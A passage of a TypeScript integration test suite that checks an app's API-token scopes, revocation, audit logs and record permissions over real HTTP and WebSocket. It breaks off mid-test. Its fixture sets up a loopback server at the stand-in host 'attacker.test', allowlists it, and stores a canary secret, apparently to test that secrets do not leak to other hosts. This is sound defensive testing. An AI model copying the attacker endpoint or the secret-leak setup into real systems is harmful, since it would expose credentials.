import { once } from 'node:events';
import { createServer, type IncomingMessage, type Server } from 'node:http';

import {
  apiTokenListSchema,
  auditLogListSchema,
  automationSchema,
  createdApiTokenSchema,
  CSRF_COOKIE,
  CSRF_HEADER,
  jobAcceptedSchema,
  newId,
  OIDC_STATE_COOKIE,
  orgApiTokenListSchema,
  recordHistoryResponseSchema,
  recordListResponseSchema,
  REALTIME_CLOSE_CODES,
  roleListSchema,
  SESSION_COOKIE,
  type ApiTokenScope,
  type CreatedApiToken,
  type Id,
  type RealtimeServerMessage,
  type RoleDto,
} from '@cellhive/contracts';
import {
  apiTokenChecksum,
  OrgMembersRepository,
  orgScope,
  UserIdentitiesRepository,
  type Db,
} from '@cellhive/server-core';
import { buildTaskList, createWorker, type WorkerHandle } from '@cellhive/worker';
import { sql } from 'kysely';
import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

import { DB } from '../../src/common/tokens.js';

import { uniqueIp } from './auth-support.js';
import { createMigratedDatabase, createTestDb, type TestDatabase } from './database.js';
import { startFakeOidc, type FakeOidcProvider, type FakeOidcUser } from './fake-oidc-support.js';
import { closeSockets, listen, TestSocket } from './realtime-support.js';
import { buildRecordFixture, type FixtureUser, type RecordFixture } from './record-fixture.js';
import { captureLogger, startTestApp, TEST_PUBLIC_URL, type TestApp } from './support.js';

import type { AddressInfo, Socket } from 'node:net';

type Method = 'GET' | 'POST' | 'PATCH' | 'PUT' | 'DELETE';
type Message = RealtimeServerMessage;

const ALL_SCOPES: ApiTokenScope[] = [
  'records:read',
  'records:write',
  'schema:read',
  'schema:write',
  'automations:read',
  'automations:write',
];
const DAY_MS = 86_400_000;
const CHALLENGE = 'Bearer error="invalid_token"';
const SECRET_CANARY = 'Bearer canary-t719-crm-secret-value';

/** A response read off the socket: status, headers, body. */
interface Wire {
  readonly status: number;
  readonly headers: Headers;
  readonly body: string;
  /** Typed like `LightMyRequestResponse.json` of the other tests (an unchecked cast). */
  // eslint-disable-next-line @typescript-eslint/no-unnecessary-type-parameters
  json<T = unknown>(): T;
}

async function eventually<T>(
  probe: () => Promise<T | undefined | false>,
  label: string,
  timeoutMs = 45_000,
): Promise<T> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = await probe();
    if (value !== undefined && value !== false) return value;
    if (Date.now() > deadline) throw new Error(`Timed out waiting for ${label}`);
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
}

/** A loopback HTTP server counting every TCP connection and request. */
interface FakeServer {
  readonly port: number;
  connections: number;
  readonly received: { url: string; headers: IncomingMessage['headers'] }[];
  close(): Promise<void>;
}

async function startServer(): Promise<FakeServer> {
  const sockets = new Set<Socket>();
  const fake: FakeServer = {
    port: 0,
    connections: 0,
    received: [],
    close: async () => {
      for (const socket of sockets) socket.destroy();
      server.close();
      await once(server, 'close');
    },
  };
  const server: Server = createServer((req, res) => {
    req.resume();
    req.on('end', () => {
      fake.received.push({ url: req.url ?? '', headers: req.headers });
      res.setHeader('content-type', 'application/json');
      res.end('{"ok":true}');
    });
  });
  server.on('connection', (socket) => {
    fake.connections += 1;
    sockets.add(socket);
    socket.on('close', () => sockets.delete(socket));
  });
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  (fake as { port: number }).port = (server.address() as AddressInfo).port;
  return fake;
}

/** The SQL text of every statement the process sends to PostgreSQL while `run` runs. */
async function sqlDuring(run: () => Promise<unknown>): Promise<string[]> {
  const statements: string[] = [];
  const prototype = pg.Client.prototype as unknown as {
    query: (this: pg.Client, ...args: unknown[]) => unknown;
  };
  const original = prototype.query;
  const spy = vi.spyOn(prototype, 'query').mockImplementation(function (
    this: pg.Client,
    ...args: unknown[]
  ) {
    const first = args[0];
    statements.push(
      typeof first === 'string' ? first : String((first as { text?: unknown } | null)?.text),
    );
    return original.apply(this, args);
  });
  try {
    await run();
  } finally {
    spy.mockRestore();
  }
  return statements;
}

/**
 * BACKLOG T719: the S6 rows of the permission matrix (CONTRACTS §5 P28,
 * P53–P64, "Phụ lục ma trận quyền S6") end to end on one fixture — every
 * request over a real TCP connection to two listening api instances
 * (`fetch`, no `inject`), a real graphile worker (exports, HTTP deliveries
 * through a resolver that maps the fake hosts to loopback), the fake OIDC
 * provider and the Node `ws` client with `Authorization`. The per-task
 * tests (T701, T703–T711) go deeper on each row; `pnpm test:matrix` runs
 * them together with this file and P01–P52.
 */
describe('permission matrix S6 over HTTP (T719)', () => {
  let database: TestDatabase;
  let db: Db;
  let idp: FakeOidcProvider;
  let a: TestApp;
  let b: TestApp;
  let wsA: string;
  let wsB: string;
  let httpA: string;
  let httpB: string;
  let fx: RecordFixture;
  let worker: WorkerHandle;
  let crm: FakeServer;
  let attacker: FakeServer;
  let clockOffsetMs = 0;
  const workerLogs = captureLogger();
  const sockets: TestSocket[] = [];

  let customer: Id<'fld'>;
  let c1: Id<'rec'>, c2: Id<'rec'>;
  let r1: Id<'rec'>, r2: Id<'rec'>;
  let base2: Id<'bse'>;
  let table2: Id<'tbl'>;
  let workspaceId: Id<'wsp'>;
  let automationId: Id<'aut'>;
  let viewId: Id<'viw'>;
  let salesRole: RoleDto;
  let groupId: Id<'grp'>;
  let secCrm: Id<'sec'>;
  const tk = {} as Record<'sales_r' | 'sales_w' | 'editor' | 'admin_b2', CreatedApiToken>;

  const F = (name: string): Id<'fld'> => {
    const field = fx.fld[name];
    if (field === undefined) throw new Error(`no field ${name}`);
    return field.id;
  };
  const orders = () => `/tables/${fx.orders.id}/records`;
  const crmHost = () => `api.crm.test:${String(crm.port)}`;
  const attackerUrl = (path: string) => `http://attacker.test:${String(attacker.port)}${path}`;

  // --- the wire ------------------------------------------------------------------------------

  async function send(
    origin: string,
    method: Method,
    path: string,
    options: { body?: unknown; headers?: Record<string, string> } = {},
  ): Promise<Wire> {
    const response = await fetch(`${origin}${path}`, {
      method,
      redirect: 'manual',
      headers: {
        // A fresh client IP each time (the server trusts loopback as a proxy):
        // failed Bearer authentications are limited per IP.
        'x-forwarded-for': uniqueIp(),
        ...(options.body === undefined ? {} : { 'content-type': 'application/json' }),
        ...options.headers,
      },
      ...(options.body === undefined ? {} : { body: JSON.stringify(options.body) }),
    });
    const body = await response.text();
    return {
      status: response.status,
      headers: response.headers,
      body,
      // eslint-disable-next-line @typescript-eslint/no-unnecessary-type-parameters
      json: <T>() => JSON.parse(body) as T,
    };
  }

  /** A request with `Authorization: Bearer <token>` (instance A unless given). */
  function bearer(
    token: string,
    method: Method,
    path: string,
    body?: unknown,
    extra: { headers?: Record<string, string>; origin?: string } = {},
  ): Promise<Wire> {
    return send(extra.origin ?? httpA, method, `/api/v1${path}`, {
      body: body ?? (method === 'GET' || method === 'DELETE' ? undefined : {}),
      headers: { authorization: `Bearer ${token}`, ...extra.headers },
    });
  }

  /** A request with the session cookie (and CSRF token) of `user`, like the SPA. */
  async function session(user: FixtureUser, method: Method, path: string, body?: unknown) {
    const cookie = await fx.cookie(user);
    const csrf = /(?:^|; )([^=]+)=([^;]*)/gu;
    let token = '';
    for (const match of cookie.matchAll(csrf)) {
      if (match[1] === CSRF_COOKIE) token = match[2] ?? '';
    }
    return send(httpA, method, `/api/v1${path}`, {
      body,
      headers: { cookie, ...(method === 'GET' ? {} : { [CSRF_HEADER]: token }) },
    });
  }

  function problem(response: Wire): {
    code?: string;
    errors?: { code: string; params?: unknown }[];
  } {
    return response.json();
  }

  function expectProblem(response: Wire, status: number, code: string): void {
    expect({ status: response.status, code: problem(response).code }, response.body).toEqual({
      status,
      code,
    });
  }

  function expect401(response: Wire, code: string): void {
    expectProblem(response, 401, code);
    expect(response.headers.get('www-authenticate')).toBe(CHALLENGE);
  }

  function expectScope(response: Wire, required: string): void {
    expectProblem(response, 403, 'INSUFFICIENT_SCOPE');
    expect(problem(response).errors?.[0]).toMatchObject({
      code: 'INSUFFICIENT_SCOPE',
      params: { required: [required] },
    });
  }

  const idsOf = (response: Wire): string[] => {
    expect(response.status, response.body).toBe(200);
    return recordListResponseSchema.parse(response.json()).records.map((record) => record.id);
  };

  async function createToken(
    user: FixtureUser,
    scopes: ApiTokenScope[],
    extra: Record<string, unknown> = {},
  ): Promise<CreatedApiToken> {
    const response = await session(user, 'POST', `/orgs/${fx.orgId}/me/api-tokens`, {
      name: `${user} ${scopes.join(' ')}`.slice(0, 100),
      scopes,
      expires_at: new Date(Date.now() + 90 * DAY_MS).toISOString(),
      ...extra,
    });
    expect(response.status, response.body).toBe(201);
    return createdApiTokenSchema.parse(response.json());
  }

  async function connectWith(token: string, url = wsB): Promise<TestSocket> {
    const result = await TestSocket.open(url, {
      authorization: `Bearer ${token}`,
      forwardedFor: uniqueIp(),
    });
    if (!result.ok) throw new Error(`refused: ${String(result.status)} ${result.body}`);
    sockets.push(result.socket);
    return result.socket;
  }

  const about =
    (type: Message['type'], recordId: string) =>
    (message: Message): boolean =>
      message.type === type && 'record_id' in message && message.record_id === recordId;
  const anyAbout = (recordId: string) => (message: Message) =>
    ('record_id' in message && message.record_id === recordId) ||
    ('record_ids' in message && message.record_ids.includes(recordId as Id<'rec'>));

  async function salesConfig(change: (tables: Record<string, Record<string, unknown>>) => void) {
    const tables = structuredClone(salesRole.config.tables) as Record<
      string,
      Record<string, unknown>
    >;
    change(tables);
    const response = await session(
      'u_admin',
      'PATCH',
      `/bases/${fx.baseId}/roles/${salesRole.id}`,
      {
        config: { ...salesRole.config, tables },
      },
    );
    expect(response.status, response.body).toBe(200);
  }

  async function restoreSales(): Promise<void> {
    const response = await session(
      'u_admin',
      'PATCH',
      `/bases/${fx.baseId}/roles/${salesRole.id}`,
      {
        config: salesRole.config,
      },
    );
    expect(response.status, response.body).toBe(200);
  }

  beforeAll(async () => {
    database = await createMigratedDatabase();
    db = createTestDb(database.url);
    idp = await startFakeOidc();
    const env = {
      DATABASE_URL: database.url,
      // `http://` issuers (the fake provider) are accepted in development only.
      NODE_ENV: 'development',
      OIDC_PROVIDERS: 'fake,mail',
      ...idp.env('fake', { NAME: 'Fake IdP' }),
      ...idp.env('mail', { NAME: 'Mail IdP', LINK_BY_EMAIL: 'true' }),
    };
    a = await startTestApp(env);
    b = await startTestApp(env);
    wsA = await listen(a.app);
    wsB = await listen(b.app);
    httpA = wsA.replace('ws://', 'http://').replace(/\/ws$/u, '');
    httpB = wsB.replace('ws://', 'http://').replace(/\/ws$/u, '');
    fx = await buildRecordFixture(a, db);

    // Customers c1, c2; Orders.customer; r1 (u_sales1, c1), r2 (u_sales2, c2).
    const field = await session('u_admin', 'POST', `/tables/${fx.orders.id}/fields`, {
      name: 'customer',
      type: 'link',
      options: { link_table: fx.customers.id },
    });
    expect(field.status, field.body).toBe(201);
    customer = field.json<{ id: Id<'fld'> }>().id;
    const customers = await session('u_admin', 'POST', `/tables/${fx.customers.id}/records`, {
      records: [{ fields: { Tên: 'An Phát' } }, { fields: { Tên: 'Bình Minh' } }],
    });
    expect(customers.status, customers.body).toBe(201);
    [c1, c2] = customers.json<{ records: { id: Id<'rec'> }[] }>().records.map((r) => r.id) as [
      Id<'rec'>,
      Id<'rec'>,
    ];
    const created = await session('u_admin', 'POST', `${orders()}?field_key_type=id`, {
      records: [
        {
          fields: {
            [F('title')]: 'r1',
            [F('amount')]: 100,
            [F('cost')]: 60,
            [F('status')]: 'Mới',
            [F('owner')]: [{ id: fx.users.u_sales1.id }],
            [customer]: [c1],
          },
        },
        {
          fields: {
            [F('title')]: 'r2',
            [F('amount')]: 200,
            [F('cost')]: 120,
            [F('status')]: 'Mới',
            [F('owner')]: [{ id: fx.users.u_sales2.id }],
            [customer]: [c2],
          },
        },
      ],
    });
    expect(created.status, created.body).toBe(201);
    [r1, r2] = created.json<{ records: { id: Id<'rec'> }[] }>().records.map((r) => r.id) as [
      Id<'rec'>,
      Id<'rec'>,
    ];

    // Base B2 (u_admin admin, u_sales1 no role) with a table of its own.
    const workspaces = await session('owner', 'GET', `/orgs/${fx.orgId}/workspaces`);
    workspaceId = workspaces.json<{ items: { id: Id<'wsp'> }[] }>().items[0]?.id as Id<'wsp'>;
    const b2 = await session('owner', 'POST', `/workspaces/${workspaceId}/bases`, { name: 'B2' });
    expect(b2.status, b2.body).toBe(201);
    base2 = b2.json<{ id: Id<'bse'> }>().id;
    const roles2 = roleListSchema.parse(
      (await session('owner', 'GET', `/bases/${base2}/roles`)).json(),
    ).items;
    const assigned = await session('owner', 'PUT', `/bases/${base2}/role-assignments`, {
      principal_type: 'user',
      principal_id: fx.users.u_admin.id,
      role_id: roles2.find((role) => role.kind === 'system_admin')?.id,
    });
    expect(assigned.status, assigned.body).toBe(200);
    const other = await session('u_admin', 'POST', `/bases/${base2}/tables`, { name: 'Other' });
    expect(other.status, other.body).toBe(201);
    table2 = other.json<{ id: Id<'tbl'> }>().id;

    const roles = roleListSchema.parse(
      (await session('u_admin', 'GET', `/bases/${fx.baseId}/roles`)).json(),
    ).items;
    const sales = roles.find((role) => role.name === 'Sales');
    if (sales === undefined) throw new Error('no Sales role');
    salesRole = sales;
    groupId = (
      await sql<{ id: Id<'grp'> }>`
        SELECT principal_id AS id FROM meta.base_role_members
         WHERE role_id = ${sales.id} AND principal_type = 'group'
      `.execute(db.kysely)
    ).rows[0]?.id as Id<'grp'>;

    // An automation and a view of B.
    const automation = await session('u_admin', 'POST', `/bases/${fx.baseId}/automations`, {
      name: 'Set amount',
      enabled: false,
      definition: {
        trigger: { type: 'record.created', table_id: fx.orders.id },
        actions: [
          {
            id: 'act_1',
            type: 'update_record',
            config: { table_id: fx.orders.id, fields: { [F('amount')]: { literal: 1 } } },
          },
        ],
      },
    });
    expect(automation.status, automation.body).toBe(201);
    automationId = automation.json<{ id: Id<'aut'> }>().id;
    const views = await session('owner', 'GET', `/tables/${fx.orders.id}/views`);
    viewId = views.json<{ items: { id: Id<'viw'> }[] }>().items[0]?.id as Id<'viw'>;

    // The tokens of the S6 fixture, made through the API.
    tk.sales_r = await createToken('u_sales1', ['records:read', 'schema:read']);
    tk.sales_w = await createToken('u_sales1', ['records:write']);
    tk.editor = await createToken('u_editor', ALL_SCOPES);
    tk.admin_b2 = await createToken('u_admin', ALL_SCOPES, { base_ids: [base2] });

    // sec_crm (`http_header`, allowed on the CRM only); both fake hosts pass the
    // SSRF guard by allowlist, so only the secret's hosts keep the attacker out.
    crm = await startServer();
    attacker = await startServer();
    for (const pattern of [crmHost(), `attacker.test:${String(attacker.port)}`]) {
      const response = await session('owner', 'POST', `/orgs/${fx.orgId}/http-allowlist`, {
        pattern,
      });
      expect(response.status, response.body).toBe(201);
    }
    const secret = await session('owner', 'POST', `/orgs/${fx.orgId}/secrets`, {
      kind: 'http_header',
      name: 'sec_crm',
      value: SECRET_CANARY,
      allowed_hosts: [crmHost()],
    });
    expect(secret.status, secret.body).toBe(201);
    secCrm = secret.json<{ id: Id<'sec'> }>().id;

    worker = await createWorker(a.config, {
      logger: workerLogs.logger,
      pollIntervalMs: 50,
      taskList: buildTaskList({
        config: a.config,
        db: a.app.get<Db>(DB),
        logger: workerLogs.logger,
        httpDelivery: {
          lookup: () => Promise.resolve(['127.0.0.1']),
          now: () => new Date(Date.now() + clockOffsetMs),
        },
      }),
    });
  });

  afterAll(async () => {
    await closeSockets(sockets);
    await worker.close();
    await crm.close();
    await attacker.close();
    await Promise.all([a.close(), b.close()]);
    await idp.close();
    await db.destroy();
    await database.drop();
  });

  // --- P28, P53 ------------------------------------------------------------------------------

  it('P06: u_admin (base admin, not org admin) creates a field and changes a role over HTTP → 200', async () => {
    const field = await session('u_admin', 'POST', `/tables/${fx.orders.id}/fields`, {
      name: 'note',
      type: 'text',
    });
    expect(field.status, field.body).toBe(201);
    const renamed = await session('u_admin', 'PATCH', `/bases/${fx.baseId}/roles/${salesRole.id}`, {
      name: 'Sales',
      config: salesRole.config,
    });
    expect(renamed.status, renamed.body).toBe(200);
  });

  it('P28: a records:read token of u_sales1 cannot PATCH r1 → 403 INSUFFICIENT_SCOPE', async () => {
    expectScope(
      await bearer(tk.sales_r.token, 'PATCH', `${orders()}/${r1}`, { fields: { amount: 1 } }),
      'records:write',
    );
    // The same user's session can (u_sales1 edits r1, P09).
    const patched = await session('u_sales1', 'PATCH', `${orders()}/${r1}`, {
      fields: { amount: 101 },
    });
    expect(patched.status, patched.body).toBe(200);
  });

  it('P53: tk_sales_r reads only r1 without cost, Customers 404; tk_sales_w PATCH r2 → 404', async () => {
    const read = await bearer(tk.sales_r.token, 'POST', `${orders()}/query`, {});
    expect(idsOf(read)).toEqual([r1]);
    const fields = recordListResponseSchema.parse(read.json()).records[0]?.fields ?? {};
    expect(Object.keys(fields)).not.toContain('cost');
    expect(Object.keys(fields)).toContain('amount');
    expectProblem(
      await bearer(tk.sales_r.token, 'GET', `/tables/${fx.customers.id}/records`),
      404,
      'NOT_FOUND',
    );
    expectScope(
      await bearer(tk.sales_r.token, 'PATCH', `${orders()}/${r1}`, { fields: { amount: 2 } }),
      'records:write',
    );
    expectProblem(
      await bearer(tk.sales_w.token, 'PATCH', `${orders()}/${r2}`, { fields: { amount: 2 } }),
      404,
      'NOT_FOUND',
    );
    // What u_sales1 may do, the write token may do: r1.amount (P09), not r1.status (P10).
    const ok = await bearer(tk.sales_w.token, 'PATCH', `${orders()}/${r1}`, {
      fields: { amount: 102 },
    });
    expect(ok.status, ok.body).toBe(200);
    expectProblem(
      await bearer(tk.sales_w.token, 'PATCH', `${orders()}/${r1}`, { fields: { status: 'Xong' } }),
      403,
      'FIELD_READ_ONLY',
    );
    // records:write never implies records:read.
    expectScope(await bearer(tk.sales_w.token, 'POST', `${orders()}/query`, {}), 'records:read');
  });

  // --- P54 -----------------------------------------------------------------------------------

  it('P54: tk_admin_b2 — base B and everything in it 404, the list has only B2, another org 404', async () => {
    const token = tk.admin_b2.token;
    for (const [method, path] of [
      ['GET', `/bases/${fx.baseId}`],
      ['GET', `/bases/${fx.baseId}/tables`],
      ['GET', orders()],
      ['POST', `${orders()}/query`],
      ['GET', `/tables/${fx.orders.id}/fields`],
      ['GET', `/fields/${F('amount')}`],
      ['GET', `/views/${viewId}`],
      ['GET', `/automations/${automationId}`],
      ['GET', `/bases/${fx.baseId}/automations`],
    ] as const) {
      expectProblem(await bearer(token, method, path), 404, 'NOT_FOUND');
    }
    expect((await bearer(token, 'GET', `/bases/${base2}`)).status).toBe(200);
    const bases = await bearer(token, 'GET', `/workspaces/${workspaceId}/bases`);
    expect(bases.json<{ items: { id: string }[] }>().items.map((base) => base.id)).toEqual([base2]);
    // The same user's session sees both.
    const both = await session('u_admin', 'GET', `/workspaces/${workspaceId}/bases`);
    expect(both.json<{ items: unknown[] }>().items).toHaveLength(2);
    // A token of organization A on routes of another organization of its user.
    const stranger = await session('stranger', 'GET', '/orgs');
    const otherOrg = stranger.json<{ items: { id: Id<'org'> }[] }>().items[0]?.id as Id<'org'>;
    const ownerToken = await createToken('owner', ['schema:read']);
    await new OrgMembersRepository(db).add(orgScope(otherOrg), fx.users.owner.id, 'member');
    expect((await session('owner', 'GET', `/orgs/${otherOrg}`)).status).toBe(200);
    expectProblem(await bearer(ownerToken.token, 'GET', `/orgs/${otherOrg}`), 404, 'NOT_FOUND');
    expectProblem(
      await bearer(ownerToken.token, 'GET', `/orgs/${otherOrg}/workspaces`),
      404,
      'NOT_FOUND',
    );
  });

  // --- P56 -----------------------------------------------------------------------------------

  it('P56: tk_editor (every scope) → 403 INSUFFICIENT_SCOPE ["session"]; a bad Bearer never falls back to the cookie', async () => {
    for (const [method, path] of [
      ['POST', `/bases/${fx.baseId}/roles`],
      ['PUT', `/bases/${fx.baseId}/role-assignments`],
      ['POST', `/orgs/${fx.orgId}/me/api-tokens`],
      ['POST', `/views/${viewId}/share-links`],
      ['GET', `/bases/${fx.baseId}/audit-logs`],
      ['GET', `/orgs/${fx.orgId}/audit-logs`],
      ['POST', `/orgs/${fx.orgId}/secrets`],
    ] as const) {
      expectScope(await bearer(tk.editor.token, method, path), 'session');
    }
    const cookie = await fx.cookie('u_editor');
    expect((await send(httpA, 'GET', '/api/v1/me', { headers: { cookie } })).status).toBe(200);
    const random = 'Zz9'.repeat(10);
    for (const authorization of [
      `Bearer cht_${random}${apiTokenChecksum(random)}`,
      'Bearer cht_short',
      `Token ${tk.editor.token}`,
    ]) {
      const response = await send(httpA, 'GET', '/api/v1/me', {
        headers: { cookie, authorization },
      });
      expect401(response, 'UNAUTHENTICATED');
      expect(response.headers.getSetCookie()).toEqual([]);
    }
  });

  // --- P57 -----------------------------------------------------------------------------------

  it('P57: own tokens only; members 403 on the org list and 404 revoking; org admin sees metadata and revokes; other org 404', async () => {
    const editorsToken = await createToken('u_editor', ['schema:read']);
    const mine = apiTokenListSchema.parse(
      (await session('u_sales1', 'GET', `/orgs/${fx.orgId}/me/api-tokens?limit=200`)).json(),
    );
    expect(mine.items.map((item) => item.id).sort()).toEqual([tk.sales_r.id, tk.sales_w.id].sort());
    for (const user of ['u_sales1', 'u_admin', 'u_reader'] as const) {
      expectProblem(
        await session(user, 'GET', `/orgs/${fx.orgId}/api-tokens`),
        403,
        'PERMISSION_DENIED',
      );
      expectProblem(
        await session(user, 'DELETE', `/api-tokens/${editorsToken.id}`),
        404,
        'NOT_FOUND',
      );
    }
    const listed = await session(
      'owner',
      'GET',
      `/orgs/${fx.orgId}/api-tokens?user_id=${fx.users.u_editor.id}&limit=200`,
    );
    expect(listed.status, listed.body).toBe(200);
    const items = orgApiTokenListSchema.parse(listed.json()).items;
    expect(items.map((item) => item.id)).toContain(editorsToken.id);
    expect(listed.body).not.toContain(editorsToken.token);
    expect(listed.body).not.toContain(tk.editor.token);
    expect(listed.body).not.toContain('token_hash');
    const revoked = await session('owner', 'DELETE', `/api-tokens/${editorsToken.id}`);
    expect(revoked.status, revoked.body).toBe(204);
    const audit = await sql<{ action: string; actor_id: string }>`
      SELECT action, actor_id FROM meta.audit_logs
       WHERE entity_id = ${editorsToken.id} ORDER BY created_at, id
    `.execute(db.kysely);
    expect(audit.rows.map((row) => [row.action, row.actor_id])).toEqual([
      ['api_token.created', fx.users.u_editor.id],
      ['api_token.revoked', fx.users.owner.id],
    ]);
    expect401(await bearer(editorsToken.token, 'GET', '/me'), 'TOKEN_REVOKED');
    for (const [method, path] of [
      ['GET', `/orgs/${fx.orgId}/api-tokens`],
      ['GET', `/orgs/${fx.orgId}/me/api-tokens`],
      ['DELETE', `/api-tokens/${tk.editor.id}`],
    ] as const) {
      expectProblem(await session('stranger', method, path), 404, 'NOT_FOUND');
    }
  });

  // --- P58 -----------------------------------------------------------------------------------

  it('P58: tk_sales_r over WS without Origin — nothing about r2 or cost, patch only amount; user: NOT_FOUND; no records:read INSUFFICIENT_SCOPE', async () => {
    const channel = `table:${fx.orders.id}`;
    const socket = await connectWith(tk.sales_r.token);
    expect(await socket.subscribe(channel)).toMatchObject({ type: 'subscribed', channel });
    const edit = (id: Id<'rec'>, fields: object) =>
      session('u_editor', 'PATCH', orders(), { records: [{ id, fields }] });
    expect((await edit(r2, { amount: 201 })).status).toBe(200);
    expect((await edit(r1, { cost: 61 })).status).toBe(200);
    await socket.expectNone(anyAbout(r2));
    await socket.expectNone(anyAbout(r1));
    expect((await edit(r1, { amount: 2_000 })).status).toBe(200);
    const update = await socket.next(about('record.updated', r1));
    expect(update).toMatchObject({ fields: { [F('amount')]: 2_000 } });
    expect(Object.keys((update as { fields: object }).fields)).toEqual([F('amount')]);

    expect(await socket.subscribe(`user:${fx.users.u_sales1.id}`, 'u')).toMatchObject({
      type: 'error',
      code: 'NOT_FOUND',
    });
    const writer = await connectWith(tk.sales_w.token);
    expect(await writer.subscribe(channel, 'w')).toMatchObject({
      type: 'error',
      code: 'INSUFFICIENT_SCOPE',
      errors: [{ params: { required: ['records:read'] } }],
    });
  });

  it('P58: revoked while open → both instances close with 4401 within 1 s', async () => {
    const token = await createToken('u_sales1', ['records:read']);
    const onA = await connectWith(token.token, wsA);
    const onB = await connectWith(token.token, wsB);
    expect(await onB.subscribe(`table:${fx.orders.id}`)).toMatchObject({ type: 'subscribed' });
    const revoked = await session('u_sales1', 'DELETE', `/api-tokens/${token.id}`);
    expect(revoked.status).toBe(204);
    const since = performance.now();
    for (const socket of [onA, onB]) {
      expect((await socket.closed).code).toBe(REALTIME_CLOSE_CODES.unauthenticated);
    }
    expect(performance.now() - since).toBeLessThan(1_000);
    // HTTP refuses it at once, on the other instance too.
    expect401(
      await bearer(token.token, 'GET', '/me', undefined, { origin: httpB }),
      'TOKEN_REVOKED',
    );
  });

  // --- P59 -----------------------------------------------------------------------------------

  it('P59: a write by tk_editor — actor u_editor, the token named only to its owner and the org owner; export by field rule with via', async () => {
    const patched = await bearer(tk.editor.token, 'PATCH', orders(), {
      records: [{ id: r1, fields: { amount: 150 } }],
    });
    expect(patched.status, patched.body).toBe(200);
    const historyAs = async (user: FixtureUser) => {
      const response = await session(user, 'GET', `${orders()}/${r1}/history`);
      expect(response.status, response.body).toBe(200);
      return recordHistoryResponseSchema
        .parse(response.json())
        .items.find((item) => 'amount' in item.changes && item.via !== null);
    };
    for (const user of ['u_editor', 'owner'] as const) {
      const entry = await historyAs(user);
      expect(entry, user).toMatchObject({
        actor: { type: 'user', id: fx.users.u_editor.id },
        via: { api_token_id: tk.editor.id, api_token_name: tk.editor.name },
      });
    }
    const anonymous = await historyAs('u_reader');
    expect(anonymous?.actor.id).toBe(fx.users.u_editor.id);
    expect(anonymous?.via).toEqual({ api_token_id: null, api_token_name: null });

    // Export: tk_sales_r has no download right (Sales download = false) → 403.
    expectProblem(
      await bearer(tk.sales_r.token, 'GET', `/tables/${fx.orders.id}/export`),
      403,
      'PERMISSION_DENIED',
    );
    const exported = await bearer(tk.editor.token, 'GET', `/tables/${fx.orders.id}/export`);
    expect(exported.status, exported.body).toBe(200);
    expect(exported.headers.get('content-type')).toContain('text/csv');
    const sessionCsv = await session('u_editor', 'GET', `/tables/${fx.orders.id}/export`);
    expect(exported.body).toBe(sessionCsv.body);
    const { rows } = await sql<{ actor_id: string; via: unknown }>`
      SELECT actor_id, via FROM meta.audit_logs
       WHERE action = 'export.created' ORDER BY created_at, id
    `.execute(db.kysely);
    expect(rows).toContainEqual({
      actor_id: fx.users.u_editor.id,
      via: { api_token_id: tk.editor.id },
    });
  });

  // --- P60 -----------------------------------------------------------------------------------

  it('P60: u_admin reads the log of B only (refs without B2), exports it; editors, members, the org route → 404', async () => {
    const page = await session(
      'u_admin',
      'GET',
      `/bases/${fx.baseId}/audit-logs?include=refs&limit=200`,
    );
    expect(page.status, page.body).toBe(200);
    const list = auditLogListSchema.parse(page.json());
    expect(list.items.length).toBeGreaterThan(0);
    expect(list.items.every((item) => item.base_id === fx.baseId)).toBe(true);
    expect(Object.keys(list.refs?.tables ?? {})).not.toContain(table2);
    for (const field of Object.values(list.refs?.fields ?? {})) {
      expect([fx.orders.id, fx.customers.id, fx.tickets.id]).toContain(field.table_id);
    }
    expectProblem(
      await session('u_admin', 'GET', `/orgs/${fx.orgId}/audit-logs`),
      404,
      'NOT_FOUND',
    );
    for (const user of ['u_editor', 'u_reader', 'u_out'] as const) {
      expectProblem(await session(user, 'GET', `/bases/${fx.baseId}/audit-logs`), 404, 'NOT_FOUND');
      expectProblem(await session(user, 'GET', `/orgs/${fx.orgId}/audit-logs`), 404, 'NOT_FOUND');
      expectProblem(
        await session(user, 'POST', `/bases/${fx.baseId}/audit-logs/export`, { format: 'csv' }),
        404,
        'NOT_FOUND',
      );
    }
    // The export runs on the real worker.
    const accepted = await session('u_admin', 'POST', `/bases/${fx.baseId}/audit-logs/export`, {
      format: 'csv',
    });
    expect(accepted.status, accepted.body).toBe(202);
    const { job_id: jobId } = jobAcceptedSchema.parse(accepted.json());
    const done = await eventually(async () => {
      const job = (await session('u_admin', 'GET', `/jobs/${jobId}`)).json<{ status: string }>();
      return job.status === 'succeeded' || job.status === 'failed' ? job : undefined;
    }, 'the base audit export');
    expect(done.status).toBe('succeeded');
    expect((await session('u_admin', 'GET', `/files/exports/${jobId}`)).status).toBe(302);
    expectProblem(await session('u_editor', 'GET', `/jobs/${jobId}`), 404, 'NOT_FOUND');
  });

  // --- P61 -----------------------------------------------------------------------------------

  it('P61: u_admin sees the access of u_sales1 (group_roles, Orders read 1 edit 1); u_editor 403; u_out, another org 404', async () => {
    const path = `/bases/${fx.baseId}/members/${fx.users.u_sales1.id}/access?counts=true`;
    const response = await session('u_admin', 'GET', path);
    expect(response.status, response.body).toBe(200);
    const body = response.json<{
      source: { kind: string; role_ids: string[] };
      counts: Record<string, { readable: number; editable: number }>;
    }>();
    expect(body.source).toMatchObject({ kind: 'group_roles', role_ids: [salesRole.id] });
    expect(body.counts[fx.orders.id]).toEqual({ readable: 1, editable: 1 });
    expect((await session('u_admin', 'GET', `/bases/${fx.baseId}/principals`)).status).toBe(200);
    expectProblem(await session('u_editor', 'GET', path), 403, 'PERMISSION_DENIED');
    expectProblem(
      await session('u_editor', 'GET', `/bases/${fx.baseId}/principals`),
      403,
      'PERMISSION_DENIED',
    );
    expectProblem(await session('u_out', 'GET', path), 404, 'NOT_FOUND');
    expectProblem(await session('stranger', 'GET', path), 404, 'NOT_FOUND');
    expectProblem(
      await session('u_admin', 'GET', `/bases/${fx.baseId}/members/${fx.users.stranger.id}/access`),
      404,
      'NOT_FOUND',
    );
  });

  // --- P62 -----------------------------------------------------------------------------------

  it('P62: a link rule (customer has_any_of [c1]) — reads, WS removal, edit_filter 403, text operator 422', async () => {
    const c1Rule = { field: customer, operator: 'has_any_of', value: [c1] };
    await salesConfig((tables) => {
      const rule = tables[fx.orders.id] as { record_rule: Record<string, unknown> };
      rule.record_rule = {
        ...rule.record_rule,
        read_scope: 'filter',
        read_filter: c1Rule,
        edit_filter: c1Rule,
      };
